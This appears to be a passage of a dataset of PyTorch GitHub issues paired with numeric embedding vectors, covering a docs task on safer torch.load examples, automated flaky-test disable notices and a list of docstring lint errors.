 -1.10939242e-01 -6.97981566e-02  1.40663460e-01  4.46876884e-01
  1.39933914e-01 -1.08579084e-01 -1.26095369e-01 -5.18206991e-02
 -2.70047694e-01 -8.83182064e-02  1.43449336e-01  5.36119938e-01
  2.01757938e-01  1.56172095e-02  3.97859007e-01  1.11419193e-01
 -1.55399829e-01 -9.11184028e-02 -2.41378397e-01 -3.80903184e-01
  5.55694252e-02 -6.74024746e-02 -2.44896188e-01 -4.76184674e-02
  2.38999724e-01  5.95954526e-03 -4.16010618e-01  4.56671976e-02
 -1.95398405e-01  1.94717020e-01  4.41016108e-01 -1.68209732e-01
  5.60804605e-02 -1.33087173e-01  3.03420246e-01  1.96444355e-02
  8.46819207e-02 -1.54559305e-02  2.79247761e-01  2.31526867e-01]"
Update torch.load examples to encourage best security practices module: docs triaged medium topic: docs docathon-h2-2023,"`torch.load` without setting `weights_only` is unsafe.
See https://github.com/pytorch/pytorch/issues/111806 and linked items there for some discussion.

This task is to update examples at https://pytorch.org/docs/stable/generated/torch.load.html to use `weights_only=True` where possible, and explicit `weights_only=False` with a comment about unsafety only where needed (you need to verify if `weights_only=True` works for a particular example).

cc @svekars @carljparker",False,"[-0.48945314  0.11819548 -0.28584373  0.21301287  0.1534369  -0.11887734
 -0.03471282  0.06931803 -0.52850676 -0.14360636 -0.17204373  0.03889109
  0.03889526  0.02863868 -0.04389242  0.16187868  0.23135039 -0.21163712
 -0.17912808 -0.10063188  0.20140797  0.12348406 -0.12392437 -0.09893624
 -0.21313709  0.11023194 -0.58100796 -0.04552579  0.17006601 -0.15065268
 -0.09578545 -0.16369322 -0.57989514 -0.02440152  0.25070357 -0.07999504
  0.1134804   0.0269978  -0.40178534  0.1894369   0.02390974  0.02358879
 -0.13247466  0.17183769 -0.3796898   0.15243325 -0.07967523 -0.04183597
 -0.34638384 -0.15782204 -0.10092483  0.21989422 -0.03196749  0.1492604
  0.15194614 -0.44620794  0.08216599 -0.00576719 -0.0483049  -0.154932
  0.32686508  0.15314071  0.0553009  -0.03466256 -0.08433307  0.01530078
  0.1145504   0.20879582  0.39838403  0.19013971  0.11786348  0.06022795
 -0.1812427  -0.20992792  0.07528915  0.07176904 -0.52465177  0.0460873
  0.04707766 -0.43450963 -0.23935813 -0.20651028  0.05857045  0.24952501
  0.0670743  -0.05821336  0.2881116  -0.06412257  0.1334223   0.4014165
 -0.15228021  0.2091683   0.14983192  0.34763217  0.07657215  0.278522
 -0.15649018 -0.11522918 -0.22644694 -0.04853565 -0.01472677 -0.45368385
 -0.23359509  0.4198424   0.24536824 -0.29635894  0.04956035  0.42421895
  0.05477539 -0.17046317  0.5704509   0.09403856 -0.05336766 -0.09358316
 -0.20740932 -0.44715178 -0.19553125 -0.3639597  -0.40932158  0.3314126
  0.28202242  0.2395362   0.12959442  0.16750535  0.6864913  -0.0134279
 -0.0854926   0.20969284 -0.15641116 -0.06798483  0.00258357 -0.02116846
  0.2154418  -0.08227432  0.38796842  0.24981947 -0.4090976   0.01183592
  0.11581587  0.34180135 -0.23826945  0.23435527 -0.02758883 -0.26309013
  0.07837762  0.24677047 -0.08783514 -0.1966297  -0.03762177 -0.09444866
  0.04290529 -0.07823922 -0.18088342  0.22933824  0.09244091  0.10904899
  0.03013446  0.13596846  0.3616271  -0.3651229  -0.0167928   0.09347942
 -0.254378    0.06524147  0.18157937 -0.08983898 -0.30167666  0.08979874
 -0.37132946  0.01958434  0.12575358 -0.17035076 -0.12249792 -0.01001879
  0.21244648 -0.11135915 -0.16857496 -0.33680236 -0.09173409  0.1881462
  0.4922957   0.19455244  0.1682395   0.23797506 -0.23627724  0.3104515
  0.25486022  0.16893202 -0.24314076 -0.05275758 -0.36433476  0.01524249
  0.00157068 -0.07337335  0.0582208   0.0341597  -0.19440578 -0.20442873
 -0.20153156 -0.10006477  0.0438764   0.28471377 -0.04580256 -0.17250416
  0.10363691  0.01683953 -0.36460406 -0.5502351  -0.06594532 -0.16303861
 -0.03572211  0.2511565  -0.27139062 -0.5007844  -0.0442811   0.18979234
 -0.17952904  0.18643647  0.13182515  0.12308323  0.28019193 -0.27461496
  0.01687596 -0.28617787 -0.02391448  0.19094236 -0.30487746  0.26202467
  0.2612232   0.10775693 -0.17534539 -0.39870867  0.2617473   0.13611044
  0.06437951  0.32071668 -0.11653604 -0.07072959 -0.2696395   0.08294384
 -0.5157976  -0.20241787  0.08978499 -0.14817356  0.09926984  0.13523678
 -0.25320956  0.375072   -0.09843191  0.01719884 -0.24242136  0.0127495
 -0.04883701 -0.01696628  0.28779894  0.22236511  0.06990743  0.10105636
 -0.03450228 -0.45553726  0.01281318  0.29120034  0.2942323   0.33353567
  0.5002242  -0.08883835 -0.10520643 -0.09966816 -0.48130465 -0.03444706
  0.27673417 -0.42515123  0.42051533  0.14331852  0.20109722 -0.19490972
  0.28149766 -0.08225298 -0.18392539 -0.2626033   0.15936361  0.00413602
 -0.17971416  0.45770687  0.39100116 -0.32771128 -0.05751545  0.15797655
 -0.24854405 -0.40675613 -0.27056372 -0.10004113  0.17505956 -0.01019897
 -0.07871588 -0.26691943  0.365306   -0.03596933  0.2242834   0.13655436
  0.11954334  0.00835733  0.28752658 -0.01764041 -0.1559422   0.05859661
  0.14537942  0.00751239  0.66490364 -0.1591095   0.17424038  0.21820384
 -0.15766747  0.13040665 -0.08721443 -0.00304279 -0.14369696  0.26892936
 -0.14274755  0.03445508  0.1606292  -0.13733816 -0.05991951  0.08942296
 -0.28273937  0.30683792 -0.0848458   0.11023087 -0.18792132 -0.07663662
  0.48706952 -0.25519264  0.32238105 -0.06151925 -0.1108876  -0.1599237
  0.05560228  0.0105529  -0.09163439 -0.16696632 -0.39482573 -0.03608119
  0.13254726  0.05295728 -0.10946657 -0.06247708  0.37605268 -0.06891176
  0.19080046  0.2999478   0.14945272  0.0499088  -0.18226722  0.2151263
  0.01650042  0.41230762 -0.07558954  0.28135502 -0.1406627   0.3452954
 -0.1803383  -0.02804996 -0.17097485 -0.11813206  0.16289288 -0.025108
 -0.110568    0.02616559  0.02467028  0.35318518  0.01085258 -0.19283953
  0.0601417   0.2610597   0.31402165 -0.06736739  0.39869094 -0.40920454
  0.15108027 -0.04507101  0.22875863 -0.01247802  0.05751583 -0.048247  ]"
DISABLED test_nested_tensor_indexing_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_indexing_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17974582867).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 9 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_indexing_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.49261582e-01 -1.55337989e-01 -2.62230635e-01  8.37581512e-03
  4.96194661e-02 -3.95254731e-01  1.39540002e-01 -5.02792522e-02
 -3.58159661e-01 -2.09619313e-01  3.95964861e-01 -9.83344018e-02
  1.22170053e-01  1.60748661e-01 -1.25106484e-01 -3.12988162e-02
 -2.65440285e-01 -1.17250994e-01  3.20660233e-01  8.69716033e-02
 -1.20898776e-01 -6.26100004e-02 -3.42900425e-01  2.10110039e-01
  1.66610569e-01  9.55380313e-03 -1.80049568e-01 -5.67469597e-02
  2.19733000e-01  1.86066061e-01  4.14793283e-01  6.97846562e-02
 -3.07494462e-01  2.32072547e-02  3.69266897e-01  2.93917537e-01
 -1.50165692e-01 -1.01448476e-01 -2.87092298e-01 -1.40741810e-01
  2.95995593e-01  4.88922261e-02  7.01855868e-02 -2.14143947e-01
  2.87051708e-01  1.88837247e-03 -1.07578970e-01  1.37336001e-01
 -2.01198786e-01 -3.90707552e-02  3.44283171e-02 -1.99931338e-01
 -1.22391388e-01 -4.65012491e-01  1.02398992e-01 -1.83916539e-01
  2.14160353e-01  2.57156640e-01  9.79946107e-02  8.50167125e-02
  5.49300648e-02 -4.28775139e-03  1.50638558e-02  8.83799419e-03
 -1.06712967e-01  7.28703588e-02  2.55835891e-01 -3.46305966e-01
  5.80325484e-01 -6.05213344e-02  3.19709569e-01  3.34606320e-02
 -2.95341820e-01  1.40680060e-01  1.51187509e-01  2.79473722e-01
 -1.55719876e-01  5.91610931e-02  4.40982766e-02  2.96038985e-02
 -1.87654078e-01 -8.27331543e-02  1.44403726e-01 -8.90392587e-02
  1.75062701e-01 -1.63743123e-02  1.63739011e-01  9.38615669e-03
  3.60303402e-01 -2.85990179e-01  3.82141411e-01  2.18347490e-01
 -2.11816758e-01 -1.59282789e-01 -3.98257673e-02 -5.05487733e-02
  3.58595759e-01 -3.73144597e-02 -3.97458076e-01  1.55714661e-01
  5.00932038e-02 -4.26822573e-01 -2.39250541e-01  4.21516061e-01
 -1.14805222e-01 -1.82812586e-02  3.94256860e-01 -1.41136721e-01
  2.03444138e-02 -1.52250588e-01  1.79079980e-01 -6.06102496e-02
  1.54201970e-01  1.73936948e-01  2.36752890e-02 -6.28118664e-02
 -9.04976875e-02  4.45505418e-03  1.98351815e-01  6.84925556e-01
 -3.27225924e-01 -1.57871038e-01  1.26805410e-01  3.38505134e-02
  3.88857543e-01  1.35139808e-01 -1.58372954e-01  3.11553515e-02
  1.02549694e-01 -1.74074546e-02  8.52544159e-02  7.10865706e-02
 -3.30385983e-01 -3.35811786e-02  2.17829961e-02  5.77266626e-02
 -1.71558291e-01 -2.99215943e-01  1.98945422e-02  6.36199266e-02
 -1.87212572e-01  1.55827984e-01 -9.90392547e-03 -2.12708309e-01
  4.95254457e-01  7.98633918e-02 -1.84377387e-01  4.30633686e-02
 -1.53501332e-01  2.09784135e-02 -5.80981523e-02  1.35486245e-01
  1.96999639e-01  3.81531477e-01  1.35523435e-02  3.73600721e-02
  3.94552052e-01  7.28487596e-02 -2.36650519e-02 -2.06718057e-01
 -4.27072048e-02  4.24309731e-01 -1.94234297e-01  1.00856192e-01
  3.47739518e-01 -6.42786697e-02 -5.11107564e-01 -1.65461823e-02
  8.55933502e-03  1.84025556e-01 -7.72777796e-02 -4.60302830e-02
 -3.07169333e-02  7.79980049e-02 -9.61170718e-03 -6.12899438e-02
  2.33955741e-01 -5.98312855e-01 -8.10769945e-02  1.97746903e-01
  9.70188826e-02 -7.55075067e-02  1.89765185e-01  1.14524245e-01
 -8.43928009e-02  1.06992677e-01  2.50671327e-01 -1.81734294e-01
  6.19765334e-02 -1.39058828e-01 -4.34836298e-01 -1.81621403e-01
  1.38771415e-01 -1.41796675e-02 -2.02166855e-01 -2.57869720e-01
  1.18121102e-01 -9.64253619e-02 -4.06101048e-02  1.00348229e-02
 -1.05742685e-01  1.39664695e-01  1.82785854e-01 -1.03852376e-01
  5.02402037e-02 -8.44663084e-02 -1.05932906e-01 -4.39212918e-01
  8.81275088e-02  1.35276049e-01 -9.66103524e-02 -1.23385914e-01
 -1.38145179e-01 -3.44159901e-01 -8.52024034e-02 -1.13725830e-02
 -3.34919319e-02 -1.16679013e-01 -7.03856647e-02  3.16348195e-01
 -2.29659215e-01 -1.76979348e-01 -3.10922652e-01 -1.39650121e-01
 -5.65806150e-01 -2.17654556e-01 -2.84487873e-01  1.82012782e-01
 -1.60212427e-01  7.73990750e-02 -1.25438899e-01 -2.07382113e-01
  2.21124589e-01 -1.18119292e-01  3.34081590e-01 -4.01934206e-01
 -3.20917308e-01 -8.93426836e-02  3.43726985e-02  5.37175536e-01
 -6.68470204e-01 -4.00169909e-01 -2.69535407e-02  6.76781088e-02
 -9.29192379e-02  9.50333849e-02  3.38659808e-02  1.72572751e-02
 -2.38025904e-01  1.81581527e-01 -9.24583301e-02 -3.64778191e-01
  2.04794690e-01  1.84888598e-02  1.84197336e-01  3.10125887e-01
 -6.22895993e-02  1.03147641e-01 -3.28870416e-02  1.25197798e-01
  1.80137098e-01  2.01339066e-01 -1.38518035e-01  5.06044328e-01
  8.43961984e-02  2.56806463e-01 -3.13661218e-01  2.57927656e-01
 -1.80649571e-02 -1.31047830e-01  4.13822591e-01 -3.14797997e-01
  1.12387605e-01 -7.17949197e-02  4.83201146e-02 -2.57625341e-01
  3.43776226e-01  2.58868992e-01 -1.87889129e-01 -1.38895214e-01
  2.46439368e-01  1.62576750e-01 -2.23744452e-01 -7.24410266e-02
  8.02943483e-03 -3.20877582e-01 -2.06446588e-01 -7.18044341e-02
 -2.08887741e-01  2.42180377e-02 -1.12446412e-01  2.14834392e-01
  1.45398855e-01 -2.17407364e-02 -4.46843922e-01  7.57841617e-02
  3.63146544e-01 -2.62346923e-01  3.11019868e-02 -3.96013334e-02
 -4.76451740e-02  2.90926713e-02  1.81889221e-01 -3.50564241e-01
  6.40403181e-02 -1.07644461e-01  2.08401531e-01  3.84084731e-02
  3.16550165e-01 -3.85175586e-01  2.76070595e-01  1.56217366e-01
 -6.32666573e-02  3.12003970e-01  1.14724636e-01 -3.54562029e-02
 -2.12433457e-01  3.68477553e-01  1.35760844e-01  1.80462003e-01
  2.73587346e-01 -2.25983813e-01 -4.10233468e-01  1.47609860e-01
  1.11895993e-01 -9.35408175e-02 -2.47639328e-01 -1.90207928e-01
 -1.37031883e-01 -6.07590005e-02 -2.10219070e-01 -2.19333157e-01
 -2.59582400e-01 -1.10684142e-01 -2.66862288e-02 -1.48403019e-01
 -2.05655694e-01  5.15853047e-01  1.50545817e-02 -1.35571241e-01
  2.15461418e-01 -3.56339663e-02  1.18661121e-01 -3.97423148e-01
 -1.17444687e-01 -1.94861352e-01  3.04961324e-01  1.58229947e-01
  2.26595327e-01  2.36304939e-01 -1.19121984e-01  1.04081385e-01
 -2.57588327e-01 -3.86670814e-04  2.05715626e-01  5.49584448e-01
  3.73233184e-02  8.10671449e-02  1.94071412e-01  5.53120375e-01
 -2.02150732e-01  2.63254493e-02 -3.94351810e-01 -3.68649781e-01
  3.59813273e-01 -1.64364114e-01 -7.69049861e-03 -1.69291660e-01
  2.44044304e-01  3.83787811e-01 -3.97601128e-01  2.46593267e-01
 -9.03138220e-02  3.10214520e-01  1.83768094e-01 -2.06323072e-01
  8.28688219e-02 -7.12926015e-02  4.63380516e-02 -9.82590616e-02
 -1.82232708e-02  7.55278170e-02 -1.26152392e-02  1.65893972e-01]"
DISABLED test_cond_side_effects (__main__.MiscTests) triaged module: flaky-tests skipped module: dynamo,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_cond_side_effects&suite=MiscTests) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17973670342).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_cond_side_effects`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `dynamo/test_misc.py`

cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False,"[-0.27654046 -0.03395739  0.09833153 -0.11984569  0.08645176 -0.24313173
  0.22829293  0.14828554 -0.42932943 -0.23425089  0.24006543  0.0876211
  0.29868546 -0.06937576 -0.13547587 -0.35058424 -0.00868782 -0.17850946
  0.11508931  0.13176715 -0.3203805   0.04302928 -0.2315385   0.16775063
 -0.1071614   0.04727767 -0.09399626  0.06868879 -0.18340845  0.00154879
  0.29785806  0.51484156 -0.47518888 -0.06022193  0.22824809  0.26947564
  0.01640772 -0.26206082 -0.19866185 -0.29160005 -0.00298441 -0.12245484
  0.12263663 -0.03165626 -0.02504133  0.07061536 -0.12169546 -0.02759782
 -0.20784038 -0.04042197  0.13382544 -0.03762664  0.23098844 -0.59794194
  0.11794538 -0.41717964  0.262226    0.4063673  -0.07472718  0.20035505
 -0.22172055 -0.06770238  0.04180169  0.06739213 -0.02553779  0.11523812
  0.06778456 -0.14825429  0.5149704   0.16793635  0.13585794  0.05793591
 -0.43592077 -0.43565488  0.13857344  0.262626   -0.24440628 -0.03434343
 -0.03362483 -0.28061703  0.08140825  0.08198642  0.09550607 -0.20524147
  0.20461601  0.01534553  0.20114201 -0.20666784  0.10060243 -0.09235121
  0.31951475 -0.00742949  0.14865217 -0.04364282 -0.10235658  0.31393772
  0.2939332  -0.10265867 -0.4013704   0.05764665  0.08835962 -0.30688345
 -0.28765523  0.32155624 -0.17073438 -0.2854539   0.41318384 -0.06927173
  0.10400474 -0.14894897  0.15752143 -0.16455781  0.1355209   0.14825365
  0.18871358 -0.17507021  0.08625945 -0.27361053 -0.03812228  0.19792365
 -0.15499377 -0.10259636  0.27449834 -0.15984847  0.23375201  0.06859779
  0.01522343  0.11473215 -0.19968086 -0.23067409 -0.10588303  0.16256021
 -0.23928843 -0.06691204 -0.16498135  0.23156874  0.02990406 -0.14813207
  0.04962843  0.23530695 -0.23043534  0.11793673 -0.00197967 -0.06618997
  0.0429571  -0.06569649 -0.27508023  0.11279449 -0.18473655 -0.06440723
  0.10866496  0.1889089   0.11999808  0.5582572   0.08791739  0.20624807
  0.15461625  0.04121713  0.06725848 -0.19843148  0.02434372  0.39156127
 -0.31391388  0.18754803  0.07999521  0.11429828 -0.4676513   0.06732608
 -0.09841806 -0.01878201 -0.17950624  0.01402658  0.14760682 -0.19855568
  0.24138245 -0.18606779  0.01907124 -0.18965551 -0.1178905   0.3725558
  0.04163117  0.14965227  0.06801151  0.5507597  -0.04408141  0.1724537
  0.1723197  -0.05865584 -0.02634321  0.07131654 -0.4639594  -0.2804548
  0.17169183  0.00991883 -0.0809934  -0.22450306  0.04650047 -0.00402763
 -0.13781683  0.01239265 -0.13434198  0.3195727   0.13575545 -0.261945
 -0.07562666  0.17664476 -0.16864374 -0.4430064   0.3270688  -0.01299129
 -0.32031453 -0.00171553  0.01191458 -0.22365484 -0.03500596  0.0669445
 -0.27668512 -0.30226633  0.17434675  0.26076692 -0.02154022 -0.13587102
  0.13943966 -0.22511235 -0.23116124  0.18218991 -0.11084993  0.11727273
  0.14937137  0.21473137  0.0497641  -0.19009185  0.32903594  0.21914074
  0.16566017 -0.0756018  -0.35476777 -0.17964903  0.0610299   0.05031038
 -0.23532061 -0.4629873  -0.04316188  0.14994575  0.01506697  0.32417464
 -0.00762891 -0.21471432 -0.36137182  0.03931824 -0.15352802 -0.5623076
  0.00397296  0.14178725  0.40811095  0.52128416 -0.03396491  0.0607615
  0.22656909 -0.2602975   0.18480884  0.50416255 -0.35119382  0.12269048
  0.18131304  0.36262566 -0.01824059  0.1350613  -0.11249098  0.0174149
  0.16713709 -0.5600936   0.19238494  0.18267474  0.28968596 -0.30753556
  0.16404483 -0.05453278 -0.05936062 -0.19482931  0.23777238 -0.17679077
  0.06729931  0.16775465  0.21548799 -0.10655709 -0.30676505 -0.25167152
 -0.21746288 -0.20106679 -0.14955226  0.34781745  0.33701864  0.08520153
 -0.19444528  0.08541366  0.11260341 -0.30037212  0.16848332 -0.03555733
 -0.28956762  0.03339506  0.11996615 -0.1917167   0.05759314 -0.08604512
 -0.07076743 -0.00117981  0.14662628 -0.3412033  -0.11931863  0.4403152
 -0.09374009  0.40493765 -0.02590854  0.03192983 -0.25503367  0.40499854
 -0.00373451  0.18816528  0.18013293 -0.0230255  -0.2936523  -0.00151629
  0.12232265  0.07228044 -0.42772505  0.00734614 -0.28545946  0.04360879
 -0.12564093 -0.00954203 -0.15052082  0.0424563  -0.15284005  0.17305613
  0.04780946  0.454108    0.11799921 -0.1313761   0.09767009 -0.07156387
  0.12972419 -0.2576567  -0.2705876   0.09534662  0.11880554  0.01053722
  0.01366859  0.05546366 -0.13084792 -0.03312052 -0.39862704  0.15040818
  0.09255531  0.4273777   0.12487864  0.08247039  0.35342875  0.46331263
 -0.33924276 -0.21829724 -0.31693488 -0.11868674 -0.03720953  0.0642713
  0.02880613 -0.14107458  0.00791488  0.19750226 -0.3718609   0.01091537
  0.02580105  0.27555     0.20108071 -0.10287994  0.20234178  0.01841176
  0.11494693  0.06878994 -0.1762419   0.15218955  0.01971562  0.23929846]"
"Fix docstring errors in _VF.py, __config__.py, _lobpcg.py, random.py, _linalg_utils.py, _namedtensor_internals.py, torch_version.py, __future__.py, _classes.py, _sources.py, _lowrank.py, _vmap_internals.py, _storage_docs.py, quasirandom.py, _appdirs.py module: docs triaged medium","- **File**: `torch/__config__.py`, **Line**: 5, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/__config__.py`, **Line**: 5, **Description**: First line should end with a period (not 'e')
- **File**: `torch/__config__.py`, **Line**: 16, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/__config__.py`, **Line**: 21, **Description**: First line should end with a period (not 's')
- **File**: `torch/__config__.py`, **Line**: 21, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/__future__.py`, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/__future__.py`, **Line**: 1, **Description**: First line should end with a period (not 's')
- **File**: `torch/_appdirs.py`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_appdirs.py`, **Line**: 8, **Description**: First line should end with a period (not 'm')
- **File**: `torch/_appdirs.py`, **Line**: 501, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_appdirs.py`, **Line**: 501, **Description**: First line should end with a period (not 'e')
- **File**: `torch/_appdirs.py`, **Line**: 501, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/_lowrank.py`, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/_lowrank.py`, **Line**: 17, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/_lowrank.py`, **Line**: 17, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lowrank.py`, **Line**: 17, **Description**: First line should end with a period (not 'h')
- **File**: `torch/_lowrank.py`, **Line**: 90, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lowrank.py`, **Line**: 90, **Description**: First line should end with a period (not ',')
- **File**: `torch/_lowrank.py`, **Line**: 194, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/_lowrank.py`, **Line**: 194, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lowrank.py`, **Line**: 194, **Description**: First line should end with a period (not 'k')
- **File**: `torch/_lowrank.py`, **Line**: 194, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/_lowrank.py`, **Line**: 194, **Description**: No blank lines allowed between a section header and its content ('Args')
- **File**: `torch/_storage_docs.py`, **Line**: 1, **Description**: First line should end with a period (not 's')
- **File**: `torch/torch_version.py`, **Line**: 7, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/torch_version.py`, **Line**: 7, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/torch_version.py`, **Line**: 7, **Description**: First line should end with a period (not 'n')
- **File**: `torch/torch_version.py`, **Line**: 42, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/torch_version.py`, **Line**: 42, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/torch_version.py`, **Line**: 42, **Description**: First line should end with a period (not '!')
- **File**: `torch/_VF.py`, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_VF.py`, **Line**: 1, **Description**: First line should end with a period (not 's')
- **File**: `torch/_classes.py`, **Line**: 34, **Description**: First line should be in imperative mood (perhaps 'Load', not 'Loads')
- **File**: `torch/_linalg_utils.py`, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/_linalg_utils.py`, **Line**: 12, **Description**: First line should end with a period (not 'r')
- **File**: `torch/_lobpcg.py`, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/_lobpcg.py`, **Line**: 75, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/_lobpcg.py`, **Line**: 75, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/_lobpcg.py`, **Line**: 106, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/_lobpcg.py`, **Line**: 106, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lobpcg.py`, **Line**: 106, **Description**: First line should be in imperative mood (perhaps 'Evaluate', not 'Evaluates')
- **File**: `torch/_lobpcg.py`, **Line**: 126, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/_lobpcg.py`, **Line**: 126, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lobpcg.py`, **Line**: 126, **Description**: First line should be in imperative mood (perhaps 'Evaluate', not 'Evaluates')
- **File**: `torch/_lobpcg.py`, **Line**: 362, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/_lobpcg.py`, **Line**: 362, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lobpcg.py`, **Line**: 362, **Description**: First line should end with a period (not 'g')
- **File**: `torch/_lobpcg.py`, **Line**: 362, **Description**: No blank lines allowed between a section header and its content ('Returns')
- **File**: `torch/_lobpcg.py`, **Line**: 362, **Description**: No blank lines allowed between a section header and its content ('References')
- **File**: `torch/_lobpcg.py`, **Line**: 776, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lobpcg.py`, **Line**: 776, **Description**: First line should end with a period (not 'e')
- **File**: `torch/_lobpcg.py`, **Line**: 851, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/_lobpcg.py`, **Line**: 894, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/_lobpcg.py`, **Line**: 945, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lobpcg.py`, **Line**: 945, **Description**: First line should end with a period (not 'z')
- **File**: `torch/_lobpcg.py`, **Line**: 1003, **Description**: No blank lines allowed between a section header and its content ('Returns')
- **File**: `torch/_lobpcg.py`, **Line**: 1064, **Description**: No blank lines allowed between a section header and its content ('Returns')
- **File**: `torch/_namedtensor_internals.py`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_namedtensor_internals.py`, **Line**: 19, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/_namedtensor_internals.py`, **Line**: 19, **Description**: First line should end with a period (not 'd')
- **File**: `torch/_namedtensor_internals.py`, **Line**: 19, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/_namedtensor_internals.py`, **Line**: 75, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/_namedtensor_internals.py`, **Line**: 75, **Description**: First line should be in imperative mood (perhaps 'Expand', not 'Expands')
- **File**: `torch/_namedtensor_internals.py`, **Line**: 116, **Description**: First line should end with a period (not '
- **File**: `torch/_sources.py`, **Line**: 15, **Description**: First line should be in imperative mood; try rephrasing (found 'Wrapper')
- **File**: `torch/_sources.py`, **Line**: 38, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_sources.py`, **Line**: 38, **Description**: Use r"""""" if any backslashes in a docstring
- **File**: `torch/_sources.py`, **Line**: 38, **Description**: First line should end with a period (not 'e')
- **File**: `torch/_sources.py`, **Line**: 38, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/_vmap_internals.py`, **Line**: 194, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/quasirandom.py`, **Line**: 6, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/quasirandom.py`, **Line**: 6, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/quasirandom.py`, **Line**: 6, **Description**: First line should end with a period (not 'g')
- **File**: `torch/quasirandom.py`, **Line**: 73, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/quasirandom.py`, **Line**: 73, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/quasirandom.py`, **Line**: 109, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/quasirandom.py`, **Line**: 109, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/quasirandom.py`, **Line**: 133, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/quasirandom.py`, **Line**: 133, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/quasirandom.py`, **Line**: 141, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/quasirandom.py`, **Line**: 141, **Description**: First line should end with a period (not 'y')
- **File**: `torch/quasirandom.py`, **Line**: 141, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/random.py`, **Line**: 10, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')

cc @carljparker",False,"[-0.31943145 -0.34556     0.05666    -0.2176864   0.10059363  0.02676941
 -0.06536447 -0.05165951 -0.33029628  0.24804339 -0.19219428 -0.00503086
